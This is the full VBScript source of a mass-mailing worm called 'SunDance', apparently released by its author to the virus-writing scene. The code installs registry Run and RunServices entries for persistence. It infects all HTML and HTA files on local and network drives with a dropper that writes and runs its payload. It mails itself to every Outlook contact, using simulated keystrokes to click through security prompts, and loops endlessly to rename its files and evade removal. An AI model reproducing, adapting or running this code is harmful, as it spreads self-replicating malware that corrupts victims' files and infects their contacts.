'This are the Last Open Source from my Vx Days
'I married my Old Girlfriend
'I am leave for a while this szene
'Thx to: AlcoPaul my Great Brother, the Brigada Ocho Members, and The RRLF Group!!!
'....bye Energy



set fso=createobject("Scripting.FileSystemObject")
set repwin=fso.GetSpecialFolder(0)
set WshShell = WScript.CreateObject("WScript.Shell")
dim Nom1,Nom2,Action,html,script,script2
dim scripthtml(1000)
Cle1="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Worm"
Cle2="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentSunDance"
Set file = fso.OpenTextFile(WScript.ScriptFullName, 1)
Script = file.ReadAll 	
Script2=replace(Script,chr(34),chr(163))
Script3=Script2
For i= 1 to 10000
do
car = left(Script3,1)
Script3=right(Script3,len(Script3)-1)
if len(Script3)=0 then exit for
if asc(car)>32 or car=" " then ScriptHtml(i)=ScriptHtml(i)+car
if car = chr(10) then exit do
loop until car = chr(10)
if ScriptHtml(i)="" then exit for
Next
call lancement
call mailoutlook
call listadriv
Call fin
sub lancement
if Wscript.ScriptFullName="C:\SunDance.vbs" then
Nom1=GenerNom()
Nom2=GenerNom()
WshShell.RegWrite Cle2+"\Run\"+Nom1,repwin+"\"+Nom2+".vbs"
WshShell.RegWrite Cle2+"\RunServices\"+Nom1,repwin+"\"+Nom2+".vbs"
Set FichDer=fso.CreateTextFile(repwin+"\"+Nom2+".vbs")
FichDer.write Script
msgbox "You Updated my SunDance E-Mail Virus..Thx: To all Members of Brigada Ocho.(c) by Energy"
end if
action=1
on error resume next
action=WshShell.RegRead(Cle1)
WshShell.RegWrite Cle1,Action
NomHtm=genernom()
set FichIn=createtextfile(repwin+"\"+NomHtm+".htm")
FichIn.writeline "<script language=vbscript>"
FichIn.writeline "<!--"
Fichin.writeline "set fso=createobject("+chr(34)+"Scripting.FileSystemObject"+chr(34)+")"
FichIn.writeline "Set WshShell = Createobject("+chr(34)+"WScript.Shell"+chr(34)+")"
FichIn.writeline "set fich=fso.createtextfile("+chr(34)+"C:\SunDance.vbs"+chr(34)+")"
FichIn.writeline "dim vbfich(10000)"
For i= 1 to 10000
FichIn.writeline "vbfich("+Cstr(i)+")= "+chr(34)+ScriptHtml(i)+chr(34)
If ScriptHtml(i)="" then exit for
Next
PlusRien:
FichIn.writeline "For i = 1 to 10000"
FichIn.writeline "vbfich(i)=replace(vbfich(i),"+chr(34)+chr(163)+chr(34)+",chr(34))"
FichIn.writeline "fich.writeline vbfich(i)"
FichIn.writeline "If vbfich(i)="+chr(34)+chr(34)+" then exit for"
FichIn.writeline "Next"
FichIn.writeline "fich.close"
FichIn.writeline "WshShell.run "+chr(34)+"C:\SunDance.vbs"+chr(34)
FichIn.writeline "-->"
FichIn.writeline "</"+"scr"+"ipt>"
FichIn.write FichIn2
FichIn.save
FichIn.close
set FichHtm=opentextfile(repwin+"\"+NomHtm+".htm",1)
Html=FichHtm.readall
FichHtm.close
end sub
Sub listadriv()
if Action = 1 then
On Error Resume Next
Dim d, dc, s
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
fileslist(d.path + "\")
folderlist(d.path + "\")
End If
Next
End if
End Sub
Sub folderlist(folderspec)
On Error Resume Next
Dim f, f1, sf
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
fileslist (f1.Path)
folderlist (f1.Path)
Next
end sub
sub fileslist(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, ap, s, bname
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
if ext="hta" or ext="html" or ext="htm" then
Set FichIn = fso.OpenTextFile(f1.path, 1)
FichIn3=FichIn.ReadAll
FichIn2 = FichIn.Readline 	
FichIn.close
if FichIn2<>"<SCRIPT language=vbscript>" then
Set FichIn = fso.CreateTextFile(f1.path)
FichIn=fso.CreateTextFile(f1.path)
FichIn.writeline "<script language=vbscript>"
FichIn.writeline "<!--"
Fichin.writeline "set fso=createobject("+chr(34)+"Scripting.FileSystemObject"+chr(34)+")"
FichIn.writeline "Set WshShell = Createobject("+chr(34)+"WScript.Shell"+chr(34)+")"
FichIn.writeline "set fich=fso.createtextfile("+chr(34)+"C:\SunDance.vbs"+chr(34)+")"
FichIn.writeline "dim vbfich(10000)"
For i= 1 to 10000
FichIn.writeline "vbfich("+Cstr(i)+")= "+chr(34)+ScriptHtml(i)+chr(34)
If ScriptHtml(i)="" then exit for
Next
PlusRien:
FichIn.writeline "For i = 1 to 10000"
FichIn.writeline "vbfich(i)=replace(vbfich(i),"+chr(34)+chr(163)+chr(34)+",chr(34))"
FichIn.writeline "fich.writeline vbfich(i)"
FichIn.writeline "If vbfich(i)="+chr(34)+chr(34)+" then exit for"
FichIn.writeline "Next"
FichIn.writeline "fich.close"
FichIn.writeline "WshShell.run "+chr(34)+"C:\SunDance.vbs"+chr(34)
FichIn.writeline "-->"
FichIn.writeline "</"+"scr"+"ipt>"
FichIn.write FichIn3
FichIn.save
FichIn.close
end if
End If
next
end sub
sub MailOutlook()
On error resume next
Set WshShell = WScript.Createobject("WScript.Shell")
Set out = CreateObject("Outlook.Application")
If out = "Outlook" and Action=1 and Wscript.ScriptFullName="C:\SunDance.vbs" Then
	Set mapi = out.GetNameSpace("MAPI")
	Set carnets = mapi.AddressLists
	For Each carnet In carnets
		If carnet.AddressEntries.Count <> 0 Then
			WshShell.AppActive "Microsoft Outlook"
			WshShell.Sendkeys "{TAB}{TAB}{TAB}{ENTER}"
			carnet2 = carnet.AddressEntries.Count
			For entree = 1 To carnet2
				Set adresse = carnet.AddressEntries(entree)
				Set message = out.CreateItem(0)
				message.to=adresse
				message.subject="SunDance Update"
				message.htmlbody=html
				message.DeleteAfterSubmit = True
				set Copie=Message.Attachments
				Copie.add Wscript.ScriptFullname
				message.send
				Wscript.Sleep 5000
				WshShell.AppActive "Microsoft Outlook"
				WshShell.Sendkeys "{TAB}{TAB}{ENTER}"
				WshShell.Sendkeys "{TAB}{TAB}{ENTER}"
			Next
		End If
	Next
End If
end sub
Sub Fin()
On error resume next
do
If action=1 then
	WScript.Sleep 2000
	WshShell.Regdelete Cle2+"\Run\"+Nom1
	WshShell.Regdelete Cle2+"\RunServices\"+Nom1
	fso.DeleteFile (repwin+"\"+Nom2+".vbs")
	Nom1=GenerNom()
	Nom2=GenerNom()
	WshShell.RegWrite Cle2+"\Run\"+Nom1,repwin+"\"+Nom2+".vbs"
	WshShell.RegWrite Cle2+"\RunServices\"+Nom1,repwin+"\"+Nom2+".vbs"
	Set FichDer=fso.CreateTextFile(repwin+"\"+Nom2+".vbs")
	FichDer.write Script
	Fichder.close
end if
loop
end sub
Function GenerNom()
Nom=""
Randomize Timer
do:h1=int(rnd*8):loop until h1>2
for lettre=1 to h1
	do:h2=int(rnd*25):loop until h2>0
	Nom=Nom+Chr(h2+66)
next
GenerNom=Nom
End Function'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''